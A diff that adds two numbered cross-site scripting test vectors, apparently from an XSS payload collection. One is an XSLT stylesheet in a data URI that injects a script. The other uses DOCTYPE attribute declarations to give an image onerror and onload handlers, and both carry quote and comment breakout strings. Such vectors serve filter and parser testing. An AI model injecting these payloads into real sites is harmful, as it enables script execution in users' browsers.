@@ -1,0 +1,7 @@
+<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
+<root/>//["'`-->]]>]</div>
+<div id="67"><!DOCTYPE x [
+    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx"
+ onerror CDATA "alert(67)"
+ onload CDATA "alert(2)">
+]><img />//["'`-->]]>]</div>
